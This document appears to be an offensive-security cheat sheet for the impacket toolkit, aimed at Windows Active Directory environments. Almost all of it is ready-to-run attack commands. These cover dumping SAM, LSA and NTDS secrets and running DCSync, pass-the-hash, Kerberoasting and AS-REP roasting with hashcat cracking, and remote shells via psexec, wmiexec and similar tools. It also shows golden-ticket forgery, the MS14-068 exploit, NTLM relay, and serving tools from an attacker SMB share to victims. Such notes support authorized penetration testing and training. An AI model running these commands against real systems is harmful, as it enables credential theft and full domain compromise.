# impacket — the Windows/AD Python toolkit

> **The AD attacker's toolbox.** Dozens of `impacket-*` scripts (or `.py` on some distros). Used for secret dumping, Kerberoast, AS-REP roast, remote exec, hash relay, and more.

**Install check (Parrot — already installed):** `impacket-secretsdump -h` or `ls /usr/share/doc/python3-impacket/examples/`

> On Parrot/Kali the wrappers are `impacket-<scriptname>`. On other distros you call them as `<scriptname>.py`. This doc uses `impacket-<name>`.

---

## 🎯 Cheat-flow: "Which script?"

| You need to... | Run this | Script |
|---|---|---|
| **Dump SAM / LSA / NTDS** | `impacket-secretsdump DOMAIN/user:pass@<IP>` | secretsdump |
| **Dump NTDS.dit offline** | `impacket-secretsdump -ntds ntds.dit -system system.hive LOCAL` | secretsdump |
| **AS-REP Roast** (no preauth) | `impacket-GetNPUsers DOMAIN/ -usersfile users.txt -no-pass` | GetNPUsers |
| **Kerberoast** (SPN tickets) | `impacket-GetUserSPNs DOMAIN/user:pass -dc-ip <DC> -request` | GetUserSPNs |
| **Shell as admin (psexec)** | `impacket-psexec DOMAIN/Administrator:pass@<IP>` | psexec |
| **Shell (smbexec, stealthier)** | `impacket-smbexec DOMAIN/user:pass@<IP>` | smbexec |
| **Shell (wmiexec, no service)** | `impacket-wmiexec DOMAIN/user:pass@<IP>` | wmiexec |
| **Host SMB share** (deliver files) | `impacket-smbserver share $(pwd) -smb2support` | smbserver |
| **Enum domain users via RID** | `impacket-lookupsid DOMAIN/anonymous@<IP>` | lookupsid |
| **MSSQL shell** | `impacket-mssqlclient DOMAIN/user:pass@<IP> -windows-auth` | mssqlclient |
| **Pass-the-hash (any)** | `-hashes LM:NT` (all scripts) | — |

---

## 🔑 Common auth syntax

Every script uses the same target string:
```
[DOMAIN/]username[:password]@<target>
```

Auth flags (shared):
| Flag | Meaning |
|---|---|
| `-hashes LM:NT` | **Pass-the-hash** (use empty LM: `aad3b435b51404eeaad3b435b51404ee`) |
| `-no-pass` | No password (AS-REP / anonymous) |
| `-k` | Use Kerberos |
| `-aesKey <key>` | AES Kerberos key (Pass-the-Key) |
| `-dc-ip <IP>` | Explicit DC IP (important for Kerberos) |
| `-target-ip <IP>` | Override target DNS |

---

## 🧪 Script-by-script

### secretsdump — the hash grabber
```bash
# Remote (needs admin)
impacket-secretsdump 'DOMAIN/admin:Password123@10.10.10.5'

# Pass-the-hash remote
impacket-secretsdump -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 \
  'DOMAIN/admin@10.10.10.5'

# DC sync (DCSync) — dump all domain hashes
impacket-secretsdump -just-dc 'DOMAIN/admin:pass@DC01'
impacket-secretsdump -just-dc-ntlm 'DOMAIN/admin:pass@DC01'

# Offline from ntds.dit + SYSTEM hive
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
```

### GetNPUsers — AS-REP Roasting
```bash
# With a userlist, no creds
impacket-GetNPUsers 'DOMAIN/' -usersfile users.txt -no-pass -dc-ip <DC>

# With a valid user (full enum)
impacket-GetNPUsers 'DOMAIN/user:pass' -request -dc-ip <DC>

# Crack the $krb5asrep$ hash
hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt
```

### GetUserSPNs — Kerberoasting
```bash
impacket-GetUserSPNs 'DOMAIN/user:pass' -dc-ip <DC> -request
impacket-GetUserSPNs 'DOMAIN/user:pass' -dc-ip <DC> -request -outputfile spns.hash

# Crack
hashcat -m 13100 spns.hash /usr/share/wordlists/rockyou.txt
```

### psexec / smbexec / wmiexec
```bash
# psexec — drops a service (loud, needs ADMIN$)
impacket-psexec 'DOMAIN/Administrator:pass@<IP>'

# smbexec — semi-interactive, less loud
impacket-smbexec 'DOMAIN/Administrator:pass@<IP>'

# wmiexec — no service, uses WMI (stealthiest)
impacket-wmiexec 'DOMAIN/Administrator:pass@<IP>'

# Pass-the-hash versions
impacket-psexec -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 'DOMAIN/Administrator@<IP>'
```

### smbserver — host files from your attacker box
```bash
# Start a share called 'share' serving current dir
impacket-smbserver share $(pwd) -smb2support

# Credentialed (some Win10 clients require it)
impacket-smbserver share $(pwd) -smb2support -username user -password pass

# On the victim:
#   copy \\<attacker>\share\tool.exe .
```

### lookupsid — RID cycling
```bash
impacket-lookupsid 'DOMAIN/anonymous@<IP>'
impacket-lookupsid 'DOMAIN/user:pass@<IP>' 10000   # range
```

### mssqlclient — SQL Server shell
```bash
impacket-mssqlclient 'DOMAIN/user:pass@<IP>' -windows-auth
# then:  enable_xp_cmdshell  ;  xp_cmdshell whoami
```

### atexec / dcomexec — alternate remote exec

Same idea as psexec but different mechanism — useful when Defender blocks psexec or port 445 is the only reliable vector.

```bash
# atexec — schedules a task, runs command, fetches output
impacket-atexec 'DOMAIN/Administrator:pass@<IP>' 'whoami /all'
impacket-atexec -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 'DOMAIN/Administrator@<IP>' 'ipconfig'

# dcomexec — DCOM-based (MMC20.Application, ShellWindows, ShellBrowserWindow)
impacket-dcomexec 'DOMAIN/Administrator:pass@<IP>' 'whoami'
impacket-dcomexec -object MMC20 'DOMAIN/user:pass@<IP>'
```

### ticketer — forge golden / silver tickets

Once you have the krbtgt NT hash (via DCSync) you can mint any ticket.

```bash
# Golden ticket (domain-wide)
impacket-ticketer -nthash <krbtgt_nt_hash> -domain-sid S-1-5-21-... \
  -domain corp.local Administrator
# Produces Administrator.ccache — use it:
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass corp.local/Administrator@dc01.corp.local

# Silver ticket (one service, e.g. CIFS on a specific host) — needs service account NT hash
impacket-ticketer -nthash <svc_nt_hash> -domain-sid S-1-5-21-... \
  -domain corp.local -spn cifs/fileserver.corp.local Administrator
```

### goldenPac.py — MS14-068 one-shot

Legacy but still tested:
```bash
impacket-goldenPac 'corp.local/lowpriv:pass@dc01.corp.local'
# Auto-exploits MS14-068, drops a SYSTEM shell on the DC via psexec
```

### rpcdump / samrdump — info enumeration

```bash
impacket-rpcdump @<IP>                       # anonymous RPC endpoint dump
impacket-samrdump 'DOMAIN/user:pass@<IP>'    # SAMR user enumeration
```

### getArch.py — fast MSRPC arch fingerprint

```bash
impacket-getArch -target <IP>
# Prints x86 vs x64 via MSRPC — useful before choosing payload arch
```

### ntlmrelayx — relay captured auth

Chain with [responder](responder.md) (SMB+HTTP off in Responder.conf):
```bash
# Targets file: list of SMB hosts with SMB signing OFF
impacket-ntlmrelayx -smb2support -tf targets.txt -c 'whoami'

# Relay to LDAP (add computer account)
impacket-ntlmrelayx -t ldap://dc01.corp.local --add-computer attacker

# Socks mode — dynamic SOCKS4 proxy per relayed session
impacket-ntlmrelayx -tf targets.txt -socks
# then: proxychains crackmapexec smb <victim> -u <relayed_user> -p ''
```

---

## 🎟 `-k -no-pass` — use cached Kerberos ticket

When you've already obtained a TGT (from `getTGT.py`, `ticketer.py`, mimikatz, or Rubeus) and exported it to a ccache:

```bash
# Get a TGT using password or NT hash
impacket-getTGT 'corp.local/alice:Pass123'
# → alice.ccache

# Export and use ANY impacket script with -k -no-pass
export KRB5CCNAME=$(pwd)/alice.ccache
impacket-psexec -k -no-pass corp.local/alice@dc01.corp.local
impacket-secretsdump -k -no-pass corp.local/alice@dc01.corp.local
impacket-wmiexec -k -no-pass corp.local/alice@dc01.corp.local
```

**Critical:** target must be an **FQDN**, not IP, and `/etc/hosts` or DNS must resolve it. Kerberos uses hostnames in SPNs.

---

## 🎯 Full Kerberoast / AS-REP workflows

### Kerberoast (authenticated)
```bash
# 1. Request TGS for every SPN the user can see
impacket-GetUserSPNs -request -dc-ip <DC_IP> \
  corp.local/alice:Pass123 -outputfile tgs.hash

# 2. Crack
hashcat -m 13100 tgs.hash /usr/share/wordlists/rockyou.txt -O

# 3. Show results
hashcat -m 13100 tgs.hash --show
```

### AS-REP Roast (no auth needed)
```bash
# 1. Enumerate users (kerbrute or BloodHound) → users.txt

# 2. Request AS-REP for users with DONT_REQ_PREAUTH
impacket-GetNPUsers corp.local/ -usersfile users.txt -no-pass \
  -dc-ip <DC_IP> -format hashcat -outputfile asrep.hash

# 3. Crack
hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt
```

---

## ⚠️ Gotchas

- **Script name differs:** Parrot/Kali uses `impacket-secretsdump`; pip install uses `secretsdump.py`. Tab-complete `impacket-` to see what's there.
- **Single-quote the target** so `$` and `!` in passwords don't expand.
- **Kerberos needs DNS.** Always set `-dc-ip` and often edit `/etc/hosts` to map the DC name.
- **Time skew.** Kerberos rejects tickets if your clock is >5 min off the DC: `sudo ntpdate <DC>` or `sudo rdate -n <DC>`.
- **Empty LM hash** placeholder is `aad3b435b51404eeaad3b435b51404ee`.
- **psexec requires ADMIN$ write + SeDebug/SeImpersonate** effectively needs a local admin.
- **wmiexec is semi-interactive** — no tab completion, no ctrl-c in shell; use full paths.
- **AS-REP target must have "Do not require preauth"** set — not all users are vulnerable.

---

## 🔗 Related

- [crackmapexec](./crackmapexec.md) — bulk front-end for many of these
- [evil-winrm](./evil-winrm.md) — nicer shell if WinRM is open
- [smbclient](./smbclient.md) / [smbmap](./smbmap.md) — SMB enum
- [responder](./responder.md) — capture hashes to feed secretsdump/ntlmrelayx
- [hashcat](./hashcat.md) — crack the hashes you dump
